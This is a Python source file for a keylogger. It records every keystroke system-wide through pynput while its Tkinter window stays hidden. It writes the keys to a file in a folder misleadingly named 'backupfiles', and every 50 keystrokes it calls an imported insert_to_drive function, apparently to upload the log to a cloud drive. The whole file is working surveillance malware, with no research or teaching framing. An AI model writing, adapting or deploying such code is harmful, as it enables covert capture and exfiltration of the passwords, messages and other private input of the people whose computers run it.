import tkinter as tk
from pynput import keyboard
import time
import os
from demo import insert_to_drive

class KeyboardListener:
    file_open_counter = 0

    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Keyboard Listener")
        self.root.withdraw()

        # Text widget to display pressed keys
        self.text_widget = tk.Text(self.root, height=10, width=40)
        self.text_widget.pack()

        # Set up the keyboard listener
        self.listener = keyboard.Listener(on_press=self.on_keyboard_event)
        self.listener.start()

        # Tkinter main loop
        self.root.mainloop()

    def on_keyboard_event(self, key):
        try:
            key_char = key.char
        except AttributeError:
            key_char = str(key)

        if key_char == 'Key.space':
            key_char = ' '

        # === creates path folder ===

        directory = "backupfiles"
        current_working_directory = os.getcwd()

        path = os.path.join(current_working_directory, directory) 

        try:
            os.mkdir(path)

        except FileExistsError:
            pass

        # === ends path folder ===

        with open(f"{path}///data.txt", "a") as file:
            file.write(f"{key_char}\n")
            
            self.file_open_counter += 1

            if self.file_open_counter % 50 == 0:
                print("file opened")
                insert_to_drive()

        # Append the pressed key to the Text widget
        self.text_widget.insert(tk.END, f"{key_char}\n")
        self.text_widget.see(tk.END)  # Scroll to the end

    def __del__(self):
        # Stop the keyboard listener when the application is closed
        if hasattr(self, 'listener'):
            self.listener.stop()

if __name__ == "__main__":
    listener = KeyboardListener()
